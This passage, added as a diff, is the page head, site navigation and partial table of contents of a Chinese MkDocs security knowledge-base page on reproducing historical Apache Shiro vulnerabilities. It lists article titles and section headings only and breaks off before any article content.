@@ -1,0 +1,2380 @@
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B02/">
+      
+      
+        <link rel="next" href="../%E6%8C%96%E7%9F%BFXMR%E5%B8%81%20%E7%A8%8B%E5%BA%8F%EF%BC%88%E7%97%85%E6%AF%92%EF%BC%89%E5%8F%91%E7%8E%B0%E4%B8%8E%E6%B8%85%E9%99%A4/">
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.5.3, mkdocs-material-9.5.9">
+    
+    
+      
+        <title>Shiro 历史版本漏洞复现 - Adm8nの知识库</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.f2e4d321.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Noto+Sans+Simplified+Chinese:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Noto Sans Simplified Chinese";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#shiro" class="md-skip">
+          跳转至
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="页眉">
+    <a href="../.." title="Adm8nの知识库" class="md-header__button md-logo" aria-label="Adm8nの知识库" data-md-component="logo">
+      
+  <img src="../../assets/logo.png" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Adm8nの知识库
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Shiro 历史版本漏洞复现
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m14.3 16-.7-2h-3.2l-.7 2H7.8L11 7h2l3.2 9h-1.9M20 8.69V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69m-9.15 3.96h2.3L12 9l-1.15 3.65Z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_2" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3 3.19.09m3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95 2.06.05m-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31Z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to system preference"  type="radio" name="__palette" id="__palette_2">
+    
+      <label class="md-header__button md-icon" title="Switch to system preference" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5c-.84 0-1.65.15-2.39.42L12 2M3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29L3.34 7m.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14L3.36 17M20.65 7l-1.77 3.79a7.023 7.023 0 0 0-2.38-4.15l4.15.36m-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29L20.64 17M12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44L12 22Z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var media,input,key,value,palette=__md_get("__palette");if(palette&&palette.color){"(prefers-color-scheme)"===palette.color.media&&(media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']"),palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent"));for([key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="查找">
+        
+        <button type="reset" class="md-search__icon md-icon" title="清空当前内容" aria-label="清空当前内容" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            正在初始化搜索引擎
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="导航栏" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="Adm8nの知识库" class="md-nav__button md-logo" aria-label="Adm8nの知识库" data-md-component="logo">
+      
+  <img src="../../assets/logo.png" alt="logo">
+
+    </a>
+    Adm8nの知识库
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Welcome to MkDocs
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    OKR
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            OKR
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../OKR/%E7%9B%AE%E6%A0%87%E7%AE%A1%E7%90%86%E6%B3%95%20OKR/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    目标管理法 OKR
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    内网小姿势
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            内网小姿势
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../%E5%86%85%E7%BD%91%E5%B0%8F%E5%A7%BF%E5%8A%BF/Ettercap%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E5%8A%AB%E6%8C%81%E7%9B%AE%E6%A0%87%E4%B8%BB%E6%9C%BADNS/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Ettercap实现内网劫持目标主机DNS
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../%E5%86%85%E7%BD%91%E5%B0%8F%E5%A7%BF%E5%8A%BF/Zerotier%E7%BB%84%E7%BD%91/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Zerotier组网
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../%E5%86%85%E7%BD%91%E5%B0%8F%E5%A7%BF%E5%8A%BF/kali%E5%AE%9E%E7%8E%B0Cookie%E4%BC%9A%E8%AF%9D%E5%8A%AB%E6%8C%81/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    kali实现Cookie会话劫持
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../%E5%86%85%E7%BD%91%E5%B0%8F%E5%A7%BF%E5%8A%BF/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E4%BA%8C/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    域渗透基础知识二
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    启明星辰溯源工程师
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            启明星辰溯源工程师
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../%E5%90%AF%E6%98%8E%E6%98%9F%E8%BE%B0%E6%BA%AF%E6%BA%90%E5%B7%A5%E7%A8%8B%E5%B8%88/%E7%AC%AC%E4%B8%89%E7%AB%A0%2001%20Web%20%E5%AE%89%E5%85%A8%E7%9B%91%E6%B5%8B%E4%B8%8E%E5%88%86%E6%9E%90/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    第三章 01 Web 安全监测与分析
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    安全杂七杂八
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            安全杂七杂八
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../%E5%AE%89%E5%85%A8%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/Hadoop%20%E9%83%A8%E7%BD%B2%E4%B8%8E%E4%BD%BF%E7%94%A8/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Hadoop 部署与使用
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../%E5%AE%89%E5%85%A8%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/MySQL%E5%BA%93%E8%A1%A8%E4%B8%8ESQL%E8%AF%AD%E5%8F%A5/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    MySQL库表与SQL语句
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../%E5%AE%89%E5%85%A8%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/PHP%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    PHP序列化与反序列化入门
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../%E5%AE%89%E5%85%A8%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/Win%E5%9F%9F%E6%8E%A7%E4%B8%8E%E7%8C%8E%E9%B9%B0%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86EDR/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Win域控与猎鹰终端安全管理EDR
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../%E5%AE%89%E5%85%A8%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/%E5%A4%A9%E6%B4%A5%E5%88%9D%E7%BA%A7%E5%B8%82%E8%B5%9B%E8%A7%A3%E9%A2%98%E9%83%A8%E5%88%86/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    2023年datacon初级赛解题部分
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../%E5%AE%89%E5%85%A8%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/%E5%B8%B8%E8%A7%81%E7%9A%84webshell%E5%B7%A5%E5%85%B7%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    常见 webshell 工具流量特征分析
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../%E5%AE%89%E5%85%A8%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%9C%AF%E8%AF%AD/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    网络安全术语
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../%E5%AE%89%E5%85%A8%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/%E8%AF%AD%E9%9B%80%E5%9B%BE%E5%BA%8A%E8%BF%81%E7%A7%BB%E9%97%AE%E9%A2%98/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    正则表达式匹配语雀图片下载卡顿问题
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../%E5%AE%89%E5%85%A8%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/%E9%95%BF%E4%BA%AD%E9%9B%B7%E6%B1%A0%E7%A4%BE%E5%8C%BA%E7%89%88%E6%9C%AC%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    长亭雷池社区版本安装与使用
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../%E5%AE%89%E5%85%A8%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/%E9%BB%91%E5%AE%A2%E4%B8%8E%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E6%8C%87%E5%8D%97/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    黑客与安全技术指南(第4章 代码审计)
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    权限提升
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6">
+            <span class="md-nav__icon md-icon"></span>
+            权限提升
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/Windows%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E2%80%94MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Windows权限提升—MySQL数据库提权
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/windows%20%E6%8F%90%E6%9D%83%E2%80%94%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Windows 提权——数据库提权
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    权限提升介绍
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    漏洞复现
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_7">
+            <span class="md-nav__icon md-icon"></span>
+            漏洞复现
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../HIKVISION%20%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    HIKVISION 综合安防管理平台任意文件上传
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Redis%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%B8%97%E9%80%8F%E4%B9%8B%E6%97%85/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Redis 未授权访问渗透之旅
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Win10%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91CVE-2020-0796%E5%A4%8D%E7%8E%B0shell/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Win10永恒之黑CVE-2020-0796复现shell
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../WinRAR%200day%E6%BC%8F%E6%B4%9ECVE-2023-38831%E5%A4%8D%E7%8E%B0%E6%9C%80%E8%AF%A6%E8%A7%A3/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    WinRAR 0day漏洞CVE-2023-38831复现最详解
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../log4j2%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B01/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Log4j2原理分析及漏洞复现1
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B02/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    log4j2漏洞复现2
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    Shiro 历史版本漏洞复现
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  <span class="md-ellipsis">
+    Shiro 历史版本漏洞复现
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#apache-shiro-cve-2010-3863" class="md-nav__link">
+    <span class="md-ellipsis">
+      Apache Shiro 认证绕过漏洞（CVE-2010-3863）
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#shiro-550cve-2016-4437" class="md-nav__link">
+    <span class="md-ellipsis">
+      Shiro-550反序列化漏洞（CVE-2016-4437）
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      漏洞简介
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      漏洞原理
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="漏洞原理">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#shiro_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      一、Shiro简介
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#shiro_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      二、Shiro服务器识别身份加解密处理的流程
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="二、Shiro服务器识别身份加解密处理的流程">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1" class="md-nav__link">
+    <span class="md-ellipsis">
+      1、加密
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2" class="md-nav__link">
+    <span class="md-ellipsis">
+      2、解密
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#key" class="md-nav__link">
+    <span class="md-ellipsis">
+      三、Key
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      漏洞复现
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#shiro-721cve-2019-12422" class="md-nav__link">
+    <span class="md-ellipsis">
+      Shiro-721反序列化漏洞（CVE-2019-12422）
+    </span>
+  </a>
+  
